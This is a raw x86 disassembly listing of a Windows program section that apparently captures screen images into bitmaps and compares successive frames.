  407397:	83 f8 1f             	cmp    $0x1f,%eax
  40739a:	77 14                	ja     0x4073b0
  40739c:	33 d2                	xor    %edx,%edx
  40739e:	8a 90 58 75 40 00    	mov    0x407558(%eax),%dl
  4073a4:	ff 24 95 50 75 40 00 	jmp    *0x407550(,%edx,4)
  4073ab:	89 4e 70             	mov    %ecx,0x70(%esi)
  4073ae:	eb 07                	jmp    0x4073b7
  4073b0:	c7 46 70 08 00 00 00 	movl   $0x8,0x70(%esi)
  4073b7:	8b ce                	mov    %esi,%ecx
  4073b9:	e8 82 08 00 00       	call   0x407c40
  4073be:	84 c0                	test   %al,%al
  4073c0:	75 16                	jne    0x4073d8
  4073c2:	ff 15 50 b3 40 00    	call   *0x40b350
  4073c8:	50                   	push   %eax
  4073c9:	89 86 0c 01 00 00    	mov    %eax,0x10c(%esi)
  4073cf:	ff 15 54 b3 40 00    	call   *0x40b354
  4073d5:	89 46 44             	mov    %eax,0x44(%esi)
  4073d8:	c7 46 10 20 00 cc 00 	movl   $0xcc0020,0x10(%esi)
  4073df:	c6 46 04 01          	movb   $0x1,0x4(%esi)
  4073e3:	ff 15 7c b1 40 00    	call   *0x40b17c
  4073e9:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  4073ed:	89 46 14             	mov    %eax,0x14(%esi)
  4073f0:	b8 e8 03 00 00       	mov    $0x3e8,%eax
  4073f5:	33 d2                	xor    %edx,%edx
  4073f7:	f7 f1                	div    %ecx
  4073f9:	8b 3d 5c b3 40 00    	mov    0x40b35c,%edi
  4073ff:	55                   	push   %ebp
  407400:	89 4e 08             	mov    %ecx,0x8(%esi)
  407403:	89 46 18             	mov    %eax,0x18(%esi)
  407406:	8a 44 24 6c          	mov    0x6c(%esp),%al
  40740a:	88 46 0c             	mov    %al,0xc(%esi)
  40740d:	ff d7                	call   *%edi
  40740f:	6a 01                	push   $0x1
  407411:	89 46 28             	mov    %eax,0x28(%esi)
  407414:	ff d7                	call   *%edi
  407416:	89 46 2c             	mov    %eax,0x2c(%esi)
  407419:	b8 20 00 00 00       	mov    $0x20,%eax
  40741e:	99                   	cltd
  40741f:	f7 7e 70             	idivl  0x70(%esi)
  407422:	8b 4e 44             	mov    0x44(%esi),%ecx
  407425:	8b 3d 98 b0 40 00    	mov    0x40b098,%edi
  40742b:	51                   	push   %ecx
  40742c:	89 6e 30             	mov    %ebp,0x30(%esi)
  40742f:	88 46 24             	mov    %al,0x24(%esi)
  407432:	ff d7                	call   *%edi
  407434:	8b 56 44             	mov    0x44(%esi),%edx
  407437:	89 46 4c             	mov    %eax,0x4c(%esi)
  40743a:	52                   	push   %edx
  40743b:	ff d7                	call   *%edi
  40743d:	55                   	push   %ebp
  40743e:	89 86 80 00 00 00    	mov    %eax,0x80(%esi)
  407444:	ff d7                	call   *%edi
  407446:	55                   	push   %ebp
  407447:	89 46 48             	mov    %eax,0x48(%esi)
  40744a:	ff d7                	call   *%edi
  40744c:	8b 4e 70             	mov    0x70(%esi),%ecx
  40744f:	89 46 50             	mov    %eax,0x50(%esi)
  407452:	8b 46 28             	mov    0x28(%esi),%eax
  407455:	6a 01                	push   $0x1
  407457:	8d 7e 5c             	lea    0x5c(%esi),%edi
  40745a:	8d 5e 60             	lea    0x60(%esi),%ebx
  40745d:	50                   	push   %eax
  40745e:	51                   	push   %ecx
  40745f:	8b ce                	mov    %esi,%ecx
  407461:	89 2f                	mov    %ebp,(%edi)
  407463:	89 2b                	mov    %ebp,(%ebx)
  407465:	e8 f6 04 00 00       	call   0x407960
  40746a:	8b 56 2c             	mov    0x2c(%esi),%edx
  40746d:	8b 4e 70             	mov    0x70(%esi),%ecx
  407470:	89 46 64             	mov    %eax,0x64(%esi)
  407473:	8b 46 28             	mov    0x28(%esi),%eax
  407476:	52                   	push   %edx
  407477:	50                   	push   %eax
  407478:	51                   	push   %ecx
  407479:	8b ce                	mov    %esi,%ecx
  40747b:	e8 e0 04 00 00       	call   0x407960
  407480:	8b 56 28             	mov    0x28(%esi),%edx
  407483:	89 46 68             	mov    %eax,0x68(%esi)
  407486:	8b 46 70             	mov    0x70(%esi),%eax
  407489:	6a 01                	push   $0x1
  40748b:	52                   	push   %edx
  40748c:	50                   	push   %eax
  40748d:	8b ce                	mov    %esi,%ecx
  40748f:	e8 cc 04 00 00       	call   0x407960
  407494:	8b 4e 64             	mov    0x64(%esi),%ecx
  407497:	8b 56 44             	mov    0x44(%esi),%edx
  40749a:	55                   	push   %ebp
  40749b:	55                   	push   %ebp
  40749c:	57                   	push   %edi
  40749d:	8b 3d 9c b0 40 00    	mov    0x40b09c,%edi
  4074a3:	55                   	push   %ebp
  4074a4:	51                   	push   %ecx
  4074a5:	52                   	push   %edx
  4074a6:	89 46 6c             	mov    %eax,0x6c(%esi)
  4074a9:	ff d7                	call   *%edi
  4074ab:	55                   	push   %ebp
  4074ac:	89 46 54             	mov    %eax,0x54(%esi)
  4074af:	55                   	push   %ebp
  4074b0:	8b 46 68             	mov    0x68(%esi),%eax
  4074b3:	8b 4e 44             	mov    0x44(%esi),%ecx
  4074b6:	53                   	push   %ebx
  4074b7:	55                   	push   %ebp
  4074b8:	50                   	push   %eax
  4074b9:	51                   	push   %ecx
  4074ba:	ff d7                	call   *%edi
  4074bc:	8b 4e 44             	mov    0x44(%esi),%ecx
  4074bf:	55                   	push   %ebp
  4074c0:	8d 56 78             	lea    0x78(%esi),%edx
  4074c3:	89 46 58             	mov    %eax,0x58(%esi)
  4074c6:	8b 46 68             	mov    0x68(%esi),%eax
  4074c9:	55                   	push   %ebp
  4074ca:	52                   	push   %edx
  4074cb:	55                   	push   %ebp
  4074cc:	50                   	push   %eax
  4074cd:	51                   	push   %ecx
  4074ce:	ff d7                	call   *%edi
  4074d0:	8b 56 58             	mov    0x58(%esi),%edx
  4074d3:	8b 3d a8 b0 40 00    	mov    0x40b0a8,%edi
  4074d9:	89 86 84 00 00 00    	mov    %eax,0x84(%esi)
  4074df:	8b 46 4c             	mov    0x4c(%esi),%eax
  4074e2:	52                   	push   %edx
  4074e3:	50                   	push   %eax
  4074e4:	ff d7                	call   *%edi
  4074e6:	8b 4e 54             	mov    0x54(%esi),%ecx
  4074e9:	8b 56 48             	mov    0x48(%esi),%edx
  4074ec:	51                   	push   %ecx
  4074ed:	52                   	push   %edx
  4074ee:	ff d7                	call   *%edi
  4074f0:	8b 86 84 00 00 00    	mov    0x84(%esi),%eax
  4074f6:	8b 8e 80 00 00 00    	mov    0x80(%esi),%ecx
  4074fc:	50                   	push   %eax
  4074fd:	51                   	push   %ecx
  4074fe:	ff d7                	call   *%edi
  407500:	8b 56 2c             	mov    0x2c(%esi),%edx
  407503:	8b 46 28             	mov    0x28(%esi),%eax
  407506:	52                   	push   %edx
  407507:	50                   	push   %eax
  407508:	55                   	push   %ebp
  407509:	8d 4e 34             	lea    0x34(%esi),%ecx
  40750c:	55                   	push   %ebp
  40750d:	51                   	push   %ecx
  40750e:	ff 15 58 b3 40 00    	call   *0x40b358
  407514:	8b 56 68             	mov    0x68(%esi),%edx
  407517:	8b 42 14             	mov    0x14(%edx),%eax
  40751a:	d1 e0                	shl    $1,%eax
  40751c:	50                   	push   %eax
  40751d:	e8 be 31 00 00       	call   0x40a6e0
  407522:	8b 4e 68             	mov    0x68(%esi),%ecx
  407525:	89 46 1c             	mov    %eax,0x1c(%esi)
  407528:	33 d2                	xor    %edx,%edx
  40752a:	83 c4 04             	add    $0x4,%esp
  40752d:	8b 41 14             	mov    0x14(%ecx),%eax
  407530:	8b 4c 24 54          	mov    0x54(%esp),%ecx
  407534:	f7 76 2c             	divl   0x2c(%esi)
  407537:	89 6e 20             	mov    %ebp,0x20(%esi)
  40753a:	5f                   	pop    %edi
  40753b:	89 46 74             	mov    %eax,0x74(%esi)
  40753e:	8b c6                	mov    %esi,%eax
  407540:	5e                   	pop    %esi
  407541:	5d                   	pop    %ebp
  407542:	5b                   	pop    %ebx
  407543:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40754a:	83 c4 50             	add    $0x50,%esp
  40754d:	c2 0c 00             	ret    $0xc
  407550:	ab                   	stos   %eax,%es:(%edi)
  407551:	73 40                	jae    0x407593
  407553:	00 b0 73 40 00 00    	add    %dh,0x4073(%eax)
  407559:	01 01                	add    %eax,(%ecx)
  40755b:	00 01                	add    %al,(%ecx)
  40755d:	01 01                	add    %eax,(%ecx)
  40755f:	00 01                	add    %al,(%ecx)
  407561:	01 01                	add    %eax,(%ecx)
  407563:	01 01                	add    %eax,(%ecx)
  407565:	01 01                	add    %eax,(%ecx)
  407567:	00 01                	add    %al,(%ecx)
  407569:	01 01                	add    %eax,(%ecx)
  40756b:	01 01                	add    %eax,(%ecx)
  40756d:	01 01                	add    %eax,(%ecx)
  40756f:	01 01                	add    %eax,(%ecx)
  407571:	01 01                	add    %eax,(%ecx)
  407573:	01 01                	add    %eax,(%ecx)
  407575:	01 01                	add    %eax,(%ecx)
  407577:	00 90 90 90 90 90    	add    %dl,-0x6f6f6f70(%eax)
  40757d:	90                   	nop
  40757e:	90                   	nop
  40757f:	90                   	nop
  407580:	56                   	push   %esi
  407581:	8b f1                	mov    %ecx,%esi
  407583:	e8 18 00 00 00       	call   0x4075a0
  407588:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40758d:	74 09                	je     0x407598
  40758f:	56                   	push   %esi
  407590:	e8 51 31 00 00       	call   0x40a6e6
  407595:	83 c4 04             	add    $0x4,%esp
  407598:	8b c6                	mov    %esi,%eax
  40759a:	5e                   	pop    %esi
  40759b:	c2 04 00             	ret    $0x4
  40759e:	90                   	nop
  40759f:	90                   	nop
  4075a0:	6a ff                	push   $0xffffffff
  4075a2:	68 0e ad 40 00       	push   $0x40ad0e
  4075a7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4075ad:	50                   	push   %eax
  4075ae:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4075b5:	51                   	push   %ecx
  4075b6:	53                   	push   %ebx
  4075b7:	56                   	push   %esi
  4075b8:	8b f1                	mov    %ecx,%esi
  4075ba:	57                   	push   %edi
  4075bb:	89 74 24 0c          	mov    %esi,0xc(%esp)
  4075bf:	c7 06 d8 b4 40 00    	movl   $0x40b4d8,(%esi)
  4075c5:	8b 46 44             	mov    0x44(%esi),%eax
  4075c8:	8b 8e 0c 01 00 00    	mov    0x10c(%esi),%ecx
  4075ce:	50                   	push   %eax
  4075cf:	51                   	push   %ecx
  4075d0:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  4075d7:	00 
  4075d8:	ff 15 4c b3 40 00    	call   *0x40b34c
  4075de:	8b 56 48             	mov    0x48(%esi),%edx
  4075e1:	8b 3d 90 b0 40 00    	mov    0x40b090,%edi
  4075e7:	52                   	push   %edx
  4075e8:	ff d7                	call   *%edi
  4075ea:	8b 46 4c             	mov    0x4c(%esi),%eax
  4075ed:	50                   	push   %eax
  4075ee:	ff d7                	call   *%edi
  4075f0:	8b 4e 50             	mov    0x50(%esi),%ecx
  4075f3:	51                   	push   %ecx
  4075f4:	ff d7                	call   *%edi
  4075f6:	8b 96 80 00 00 00    	mov    0x80(%esi),%edx
  4075fc:	52                   	push   %edx
  4075fd:	ff d7                	call   *%edi
  4075ff:	8b 46 54             	mov    0x54(%esi),%eax
  407602:	8b 3d 94 b0 40 00    	mov    0x40b094,%edi
  407608:	50                   	push   %eax
  407609:	ff d7                	call   *%edi
  40760b:	8b 4e 58             	mov    0x58(%esi),%ecx
  40760e:	51                   	push   %ecx
  40760f:	ff d7                	call   *%edi
  407611:	8b 96 84 00 00 00    	mov    0x84(%esi),%edx
  407617:	52                   	push   %edx
  407618:	ff d7                	call   *%edi
  40761a:	8b 46 1c             	mov    0x1c(%esi),%eax
  40761d:	85 c0                	test   %eax,%eax
  40761f:	74 09                	je     0x40762a
  407621:	50                   	push   %eax
  407622:	e8 bf 30 00 00       	call   0x40a6e6
  407627:	83 c4 04             	add    $0x4,%esp
  40762a:	8b 46 68             	mov    0x68(%esi),%eax
  40762d:	50                   	push   %eax
  40762e:	e8 b3 30 00 00       	call   0x40a6e6
  407633:	8b 4e 64             	mov    0x64(%esi),%ecx
  407636:	51                   	push   %ecx
  407637:	e8 aa 30 00 00       	call   0x40a6e6
  40763c:	8b 56 6c             	mov    0x6c(%esi),%edx
  40763f:	52                   	push   %edx
  407640:	e8 a1 30 00 00       	call   0x40a6e6
  407645:	8b 1d 8c b3 40 00    	mov    0x40b38c,%ebx
  40764b:	83 c4 0c             	add    $0xc,%esp
  40764e:	c7 86 88 00 00 00 d4 	movl   $0x40b4d4,0x88(%esi)
  407655:	b4 40 00 
  407658:	81 c6 cc 00 00 00    	add    $0xcc,%esi
  40765e:	bf 10 00 00 00       	mov    $0x10,%edi
  407663:	8b 06                	mov    (%esi),%eax
  407665:	50                   	push   %eax
  407666:	ff d3                	call   *%ebx
  407668:	83 c6 04             	add    $0x4,%esi
  40766b:	4f                   	dec    %edi
  40766c:	75 f5                	jne    0x407663
  40766e:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  407672:	5f                   	pop    %edi
  407673:	5e                   	pop    %esi
  407674:	5b                   	pop    %ebx
  407675:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40767c:	83 c4 10             	add    $0x10,%esp
  40767f:	c3                   	ret
  407680:	83 ec 1c             	sub    $0x1c,%esp
  407683:	53                   	push   %ebx
  407684:	55                   	push   %ebp
  407685:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  407689:	56                   	push   %esi
  40768a:	57                   	push   %edi
  40768b:	33 ff                	xor    %edi,%edi
  40768d:	3b ef                	cmp    %edi,%ebp
  40768f:	8b f1                	mov    %ecx,%esi
  407691:	0f 84 9c 01 00 00    	je     0x407833
  407697:	39 7e 1c             	cmp    %edi,0x1c(%esi)
  40769a:	0f 84 93 01 00 00    	je     0x407833
  4076a0:	e8 9b 05 00 00       	call   0x407c40
  4076a5:	8d 5e 04             	lea    0x4(%esi),%ebx
  4076a8:	6a 01                	push   $0x1
  4076aa:	53                   	push   %ebx
  4076ab:	8b ce                	mov    %esi,%ecx
  4076ad:	89 7e 20             	mov    %edi,0x20(%esi)
  4076b0:	e8 cb 03 00 00       	call   0x407a80
  4076b5:	8d 44 24 10          	lea    0x10(%esp),%eax
  4076b9:	50                   	push   %eax
  4076ba:	ff 15 44 b3 40 00    	call   *0x40b344
  4076c0:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4076c4:	6a 08                	push   $0x8
  4076c6:	51                   	push   %ecx
  4076c7:	8b ce                	mov    %esi,%ecx
  4076c9:	e8 b2 03 00 00       	call   0x407a80
  4076ce:	8d 54 24 18          	lea    0x18(%esp),%edx
  4076d2:	c7 44 24 18 14 00 00 	movl   $0x14,0x18(%esp)
  4076d9:	00 
  4076da:	52                   	push   %edx
  4076db:	ff 15 48 b3 40 00    	call   *0x40b348
  4076e1:	85 c0                	test   %eax,%eax
  4076e3:	74 31                	je     0x407716
  4076e5:	83 7c 24 1c 01       	cmpl   $0x1,0x1c(%esp)
  4076ea:	75 2a                	jne    0x407716
  4076ec:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  4076f0:	8d 86 cc 00 00 00    	lea    0xcc(%esi),%eax
  4076f6:	3b 08                	cmp    (%eax),%ecx
  4076f8:	74 09                	je     0x407703
  4076fa:	47                   	inc    %edi
  4076fb:	83 c0 04             	add    $0x4,%eax
  4076fe:	83 ff 10             	cmp    $0x10,%edi
  407701:	7c f3                	jl     0x4076f6
  407703:	51                   	push   %ecx
  407704:	ff 15 8c b3 40 00    	call   *0x40b38c
  40770a:	83 ff 10             	cmp    $0x10,%edi
  40770d:	75 03                	jne    0x407712
  40770f:	83 cf ff             	or     $0xffffffff,%edi
  407712:	8b c7                	mov    %edi,%eax
  407714:	eb 03                	jmp    0x407719
  407716:	83 c8 ff             	or     $0xffffffff,%eax
  407719:	88 44 24 30          	mov    %al,0x30(%esp)
  40771d:	8d 44 24 30          	lea    0x30(%esp),%eax
  407721:	6a 01                	push   $0x1
  407723:	50                   	push   %eax
  407724:	8b ce                	mov    %esi,%ecx
  407726:	e8 55 03 00 00       	call   0x407a80
  40772b:	80 3b 02             	cmpb   $0x2,(%ebx)
  40772e:	75 51                	jne    0x407781
  407730:	8b 46 68             	mov    0x68(%esi),%eax
  407733:	8b 48 08             	mov    0x8(%eax),%ecx
  407736:	8b 50 04             	mov    0x4(%eax),%edx
  407739:	8b 46 44             	mov    0x44(%esi),%eax
  40773c:	51                   	push   %ecx
  40773d:	8b 8e 80 00 00 00    	mov    0x80(%esi),%ecx
  407743:	52                   	push   %edx
  407744:	50                   	push   %eax
  407745:	51                   	push   %ecx
  407746:	8b ce                	mov    %esi,%ecx
  407748:	e8 33 05 00 00       	call   0x407c80
  40774d:	8b 56 68             	mov    0x68(%esi),%edx
  407750:	8b 4e 20             	mov    0x20(%esi),%ecx
  407753:	8b 42 14             	mov    0x14(%edx),%eax
  407756:	8b 56 60             	mov    0x60(%esi),%edx
  407759:	50                   	push   %eax
  40775a:	8b 46 1c             	mov    0x1c(%esi),%eax
  40775d:	03 c8                	add    %eax,%ecx
  40775f:	8b 46 78             	mov    0x78(%esi),%eax
  407762:	51                   	push   %ecx
  407763:	52                   	push   %edx
  407764:	50                   	push   %eax
  407765:	8b ce                	mov    %esi,%ecx
  407767:	e8 74 05 00 00       	call   0x407ce0
  40776c:	8b 4e 20             	mov    0x20(%esi),%ecx
  40776f:	5f                   	pop    %edi
  407770:	03 c1                	add    %ecx,%eax
  407772:	89 45 00             	mov    %eax,0x0(%ebp)
  407775:	8b 46 1c             	mov    0x1c(%esi),%eax
  407778:	5e                   	pop    %esi
  407779:	5d                   	pop    %ebp
  40777a:	5b                   	pop    %ebx
  40777b:	83 c4 1c             	add    $0x1c,%esp
  40777e:	c2 04 00             	ret    $0x4
  407781:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  407785:	33 d2                	xor    %edx,%edx
  407787:	8d 41 ed             	lea    -0x13(%ecx),%eax
  40778a:	85 c0                	test   %eax,%eax
  40778c:	0f 9c c2             	setl   %dl
  40778f:	4a                   	dec    %edx
  407790:	23 d0                	and    %eax,%edx
  407792:	a1 48 e8 40 00       	mov    0x40e848,%eax
  407797:	3b c8                	cmp    %eax,%ecx
  407799:	8b fa                	mov    %edx,%edi
  40779b:	74 11                	je     0x4077ae
  40779d:	57                   	push   %edi
  40779e:	8b ce                	mov    %esi,%ecx
  4077a0:	e8 9b 00 00 00       	call   0x407840
  4077a5:	84 c0                	test   %al,%al
  4077a7:	74 05                	je     0x4077ae
  4077a9:	83 c7 13             	add    $0x13,%edi
  4077ac:	eb 03                	jmp    0x4077b1
  4077ae:	8b 7e 30             	mov    0x30(%esi),%edi
  4077b1:	3b 7e 2c             	cmp    0x2c(%esi),%edi
  4077b4:	7d 19                	jge    0x4077cf
  4077b6:	57                   	push   %edi
  4077b7:	8b ce                	mov    %esi,%ecx
  4077b9:	e8 82 00 00 00       	call   0x407840
  4077be:	84 c0                	test   %al,%al
  4077c0:	74 03                	je     0x4077c5
  4077c2:	83 c7 13             	add    $0x13,%edi
  4077c5:	8b 46 2c             	mov    0x2c(%esi),%eax
  4077c8:	83 c7 13             	add    $0x13,%edi
  4077cb:	3b f8                	cmp    %eax,%edi
  4077cd:	7c e7                	jl     0x4077b6
  4077cf:	8b 44 24 14          	mov    0x14(%esp),%eax
  4077d3:	b9 13 00 00 00       	mov    $0x13,%ecx
  4077d8:	a3 48 e8 40 00       	mov    %eax,0x40e848
  4077dd:	8b 46 30             	mov    0x30(%esi),%eax
  4077e0:	83 c0 03             	add    $0x3,%eax
  4077e3:	8b 1d 7c b1 40 00    	mov    0x40b17c,%ebx
  4077e9:	99                   	cltd
  4077ea:	f7 f9                	idiv   %ecx
  4077ec:	8d 7e 14             	lea    0x14(%esi),%edi
  4077ef:	89 56 30             	mov    %edx,0x30(%esi)
  4077f2:	8b 56 20             	mov    0x20(%esi),%edx
  4077f5:	89 55 00             	mov    %edx,0x0(%ebp)
  4077f8:	ff d3                	call   *%ebx
  4077fa:	8b 17                	mov    (%edi),%edx
  4077fc:	8b 4e 18             	mov    0x18(%esi),%ecx
  4077ff:	2b c2                	sub    %edx,%eax
  407801:	3b c1                	cmp    %ecx,%eax
  407803:	73 17                	jae    0x40781c
  407805:	8b 2d c4 b0 40 00    	mov    0x40b0c4,%ebp
  40780b:	6a 01                	push   $0x1
  40780d:	ff d5                	call   *%ebp
  40780f:	ff d3                	call   *%ebx
  407811:	8b 17                	mov    (%edi),%edx
  407813:	8b 4e 18             	mov    0x18(%esi),%ecx
  407816:	2b c2                	sub    %edx,%eax
  407818:	3b c1                	cmp    %ecx,%eax
  40781a:	72 ef                	jb     0x40780b
  40781c:	ff d3                	call   *%ebx
  40781e:	50                   	push   %eax
  40781f:	57                   	push   %edi
  407820:	ff 15 bc b0 40 00    	call   *0x40b0bc
  407826:	8b 46 1c             	mov    0x1c(%esi),%eax
  407829:	5f                   	pop    %edi
  40782a:	5e                   	pop    %esi
  40782b:	5d                   	pop    %ebp
  40782c:	5b                   	pop    %ebx
  40782d:	83 c4 1c             	add    $0x1c,%esp
  407830:	c2 04 00             	ret    $0x4
  407833:	5f                   	pop    %edi
  407834:	5e                   	pop    %esi
  407835:	5d                   	pop    %ebp
  407836:	33 c0                	xor    %eax,%eax
  407838:	5b                   	pop    %ebx
  407839:	83 c4 1c             	add    $0x1c,%esp
  40783c:	c2 04 00             	ret    $0x4
  40783f:	90                   	nop
  407840:	51                   	push   %ecx
  407841:	53                   	push   %ebx
  407842:	55                   	push   %ebp
  407843:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  407847:	56                   	push   %esi
  407848:	8b f1                	mov    %ecx,%esi
  40784a:	57                   	push   %edi
  40784b:	8b 46 10             	mov    0x10(%esi),%eax
  40784e:	8b 4e 44             	mov    0x44(%esi),%ecx
  407851:	8b 56 28             	mov    0x28(%esi),%edx
  407854:	50                   	push   %eax
  407855:	8b 46 48             	mov    0x48(%esi),%eax
  407858:	55                   	push   %ebp
  407859:	6a 00                	push   $0x0
  40785b:	51                   	push   %ecx
  40785c:	6a 01                	push   $0x1
  40785e:	52                   	push   %edx
  40785f:	6a 00                	push   $0x0
  407861:	6a 00                	push   $0x0
  407863:	50                   	push   %eax
  407864:	ff 15 a0 b0 40 00    	call   *0x40b0a0
  40786a:	8b 7e 2c             	mov    0x2c(%esi),%edi
  40786d:	8b 4e 60             	mov    0x60(%esi),%ecx
  407870:	2b fd                	sub    %ebp,%edi
  407872:	8d 55 26             	lea    0x26(%ebp),%edx
  407875:	4f                   	dec    %edi
  407876:	52                   	push   %edx
  407877:	0f af 7e 74          	imul   0x74(%esi),%edi
  40787b:	83 c5 ed             	add    $0xffffffed,%ebp
  40787e:	6a ff                	push   $0xffffffff
  407880:	03 f9                	add    %ecx,%edi
  407882:	8b 4e 5c             	mov    0x5c(%esi),%ecx
  407885:	8d 5e 34             	lea    0x34(%esi),%ebx
  407888:	55                   	push   %ebp
  407889:	6a ff                	push   $0xffffffff
  40788b:	53                   	push   %ebx
  40788c:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  407890:	ff 15 58 b3 40 00    	call   *0x40b358
  407896:	8b 46 28             	mov    0x28(%esi),%eax
  407899:	85 c0                	test   %eax,%eax
  40789b:	7e 43                	jle    0x4078e0
  40789d:	33 c9                	xor    %ecx,%ecx
  40789f:	8a 4e 24             	mov    0x24(%esi),%cl
  4078a2:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4078a6:	b9 18 00 00 00       	mov    $0x18,%ecx
  4078ab:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4078af:	8b 17                	mov    (%edi),%edx
  4078b1:	3b 55 00             	cmp    0x0(%ebp),%edx
  4078b4:	74 0f                	je     0x4078c5
  4078b6:	8b 56 3c             	mov    0x3c(%esi),%edx
  4078b9:	85 d2                	test   %edx,%edx
  4078bb:	7d 05                	jge    0x4078c2
  4078bd:	8d 51 d0             	lea    -0x30(%ecx),%edx
  4078c0:	89 13                	mov    %edx,(%ebx)
  4078c2:	89 4e 3c             	mov    %ecx,0x3c(%esi)
  4078c5:	8b 54 24 10          	mov    0x10(%esp),%edx
  4078c9:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4078cd:	03 ca                	add    %edx,%ecx
  4078cf:	83 c7 04             	add    $0x4,%edi
  4078d2:	83 c5 04             	add    $0x4,%ebp
  4078d5:	8d 51 e8             	lea    -0x18(%ecx),%edx
  4078d8:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  4078dc:	3b d0                	cmp    %eax,%edx
  4078de:	7c cb                	jl     0x4078ab
  4078e0:	8b 7e 3c             	mov    0x3c(%esi),%edi
  4078e3:	83 ff ff             	cmp    $0xffffffff,%edi
  4078e6:	7e 48                	jle    0x407930
  4078e8:	8b 0b                	mov    (%ebx),%ecx
  4078ea:	33 d2                	xor    %edx,%edx
  4078ec:	85 c9                	test   %ecx,%ecx
  4078ee:	0f 9e c2             	setle  %dl
  4078f1:	4a                   	dec    %edx
  4078f2:	23 ca                	and    %edx,%ecx
  4078f4:	33 d2                	xor    %edx,%edx
  4078f6:	89 0b                	mov    %ecx,(%ebx)
  4078f8:	8b 4e 38             	mov    0x38(%esi),%ecx
  4078fb:	85 c9                	test   %ecx,%ecx
  4078fd:	0f 9e c2             	setle  %dl
  407900:	4a                   	dec    %edx
  407901:	23 ca                	and    %edx,%ecx
  407903:	3b f8                	cmp    %eax,%edi
  407905:	89 4e 38             	mov    %ecx,0x38(%esi)
  407908:	7d 02                	jge    0x40790c
  40790a:	8b c7                	mov    %edi,%eax
  40790c:	8b 4e 2c             	mov    0x2c(%esi),%ecx
  40790f:	89 46 3c             	mov    %eax,0x3c(%esi)
  407912:	8b 46 40             	mov    0x40(%esi),%eax
  407915:	3b c1                	cmp    %ecx,%eax
  407917:	7c 02                	jl     0x40791b
  407919:	8b c1                	mov    %ecx,%eax
  40791b:	53                   	push   %ebx
  40791c:	8b ce                	mov    %esi,%ecx
  40791e:	89 46 40             	mov    %eax,0x40(%esi)
  407921:	e8 ca 01 00 00       	call   0x407af0
  407926:	5f                   	pop    %edi
  407927:	5e                   	pop    %esi
  407928:	5d                   	pop    %ebp
  407929:	b0 01                	mov    $0x1,%al
  40792b:	5b                   	pop    %ebx
  40792c:	59                   	pop    %ecx
  40792d:	c2 04 00             	ret    $0x4
  407930:	5f                   	pop    %edi
  407931:	5e                   	pop    %esi
  407932:	5d                   	pop    %ebp
  407933:	32 c0                	xor    %al,%al
  407935:	5b                   	pop    %ebx
  407936:	59                   	pop    %ecx
  407937:	c2 04 00             	ret    $0x4
  40793a:	90                   	nop
  40793b:	90                   	nop
  40793c:	90                   	nop
  40793d:	90                   	nop
  40793e:	90                   	nop
  40793f:	90                   	nop
  407940:	8b 44 24 04          	mov    0x4(%esp),%eax
  407944:	83 c1 04             	add    $0x4,%ecx
  407947:	50                   	push   %eax
  407948:	51                   	push   %ecx
  407949:	ff 15 bc b0 40 00    	call   *0x40b0bc
  40794f:	c2 04 00             	ret    $0x4
  407952:	90                   	nop
  407953:	90                   	nop
  407954:	90                   	nop
  407955:	90                   	nop
  407956:	90                   	nop
  407957:	90                   	nop
  407958:	90                   	nop
  407959:	90                   	nop
  40795a:	90                   	nop
  40795b:	90                   	nop
  40795c:	90                   	nop
  40795d:	90                   	nop
  40795e:	90                   	nop
  40795f:	90                   	nop
  407960:	51                   	push   %ecx
  407961:	53                   	push   %ebx
  407962:	55                   	push   %ebp
  407963:	56                   	push   %esi
  407964:	57                   	push   %edi
  407965:	8b 7c 24 18          	mov    0x18(%esp),%edi
  407969:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40796d:	83 ff 08             	cmp    $0x8,%edi
  407970:	7f 0d                	jg     0x40797f
  407972:	bd 01 00 00 00       	mov    $0x1,%ebp
  407977:	8b cf                	mov    %edi,%ecx
  407979:	d3 e5                	shl    %cl,%ebp
  40797b:	33 db                	xor    %ebx,%ebx
  40797d:	eb 04                	jmp    0x407983
  40797f:	33 db                	xor    %ebx,%ebx
  407981:	33 ed                	xor    %ebp,%ebp
  407983:	8d 04 ad 28 00 00 00 	lea    0x28(,%ebp,4),%eax
  40798a:	50                   	push   %eax
  40798b:	e8 50 2d 00 00       	call   0x40a6e0
  407990:	8b d7                	mov    %edi,%edx
  407992:	8b f0                	mov    %eax,%esi
  407994:	8b 44 24 20          	mov    0x20(%esp),%eax
  407998:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  40799e:	0f af d0             	imul   %eax,%edx
  4079a1:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4079a5:	83 c2 1f             	add    $0x1f,%edx
  4079a8:	c1 fa 03             	sar    $0x3,%edx
  4079ab:	83 e2 fc             	and    $0xfffffffc,%edx
  4079ae:	83 c4 04             	add    $0x4,%esp
  4079b1:	0f af d1             	imul   %ecx,%edx
  4079b4:	83 ff 10             	cmp    $0x10,%edi
  4079b7:	c7 06 28 00 00 00    	movl   $0x28,(%esi)
  4079bd:	89 46 04             	mov    %eax,0x4(%esi)
  4079c0:	89 4e 08             	mov    %ecx,0x8(%esi)
  4079c3:	66 c7 46 0c 01 00    	movw   $0x1,0xc(%esi)
  4079c9:	66 89 7e 0e          	mov    %di,0xe(%esi)
  4079cd:	89 5e 10             	mov    %ebx,0x10(%esi)
  4079d0:	89 5e 18             	mov    %ebx,0x18(%esi)
  4079d3:	89 5e 1c             	mov    %ebx,0x1c(%esi)
  4079d6:	89 5e 20             	mov    %ebx,0x20(%esi)
  4079d9:	89 5e 24             	mov    %ebx,0x24(%esi)
